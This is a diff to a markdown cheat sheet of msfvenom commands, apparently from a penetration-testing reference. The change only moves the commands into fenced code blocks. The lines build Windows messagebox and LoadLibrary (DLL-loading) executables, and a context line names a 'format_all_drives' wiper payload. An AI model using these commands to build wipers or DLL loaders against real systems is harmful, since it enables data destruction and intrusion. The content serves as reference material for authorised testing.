@@ -48,18 +48,26 @@ $ msfvenom -p windows/format_all_drives volumelabel=<label> -f exe -o wiper-x86.
 
 ### 6.1 - x86 (32-bit) Payloads
 
-`$ msfvenom -p windows/messagebox exitfunc=<seh | thread | process | none> icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> title=<title> text=<text> -f exe -o msgbox-x86.exe`
+```
+$ msfvenom -p windows/messagebox exitfunc=<seh | thread | process | none> icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> title=<title> text=<text> -f exe -o msgbox-x86.exe
+```
 
 ### 6.2 - x86-64 (64-bit) Payloads
 
-`$ msfvenom -p windows/x64/messagebox exitfunc=<seh | thread | process | none> icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> title=<title> text=<text> -f exe -o msgbox-x64.exe`
+```
+$ msfvenom -p windows/x64/messagebox exitfunc=<seh | thread | process | none> icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> title=<title> text=<text> -f exe -o msgbox-x64.exe
+```
 
 ## 07 - LoadLibrary Windows Exec Payload
 
 ### 7.1 - x86 (32-bit) Payloads
 
-`$ msfvenom -p windows/loadlibrary exitfunc=<seh | thread | process | none> dll=C:\\path\\to\\file.dll -f exe -o load-dll-x86.exe`
+```
+$ msfvenom -p windows/loadlibrary exitfunc=<seh | thread | process | none> dll=C:\\path\\to\\file.dll -f exe -o load-dll-x86.exe
+```
 
 ### 7.2 - x86-64 (64-bit) Payloads
 
-`$ msfvenom -p windows/x64/loadlibrary exitfunc=<seh | thread | process | none> dll=C:\\path\\to\\file.dll -f exe -o load-dll-x64.exe`
+```
+$ msfvenom -p windows/x64/loadlibrary exitfunc=<seh | thread | process | none> dll=C:\\path\\to\\file.dll -f exe -o load-dll-x64.exe
+```
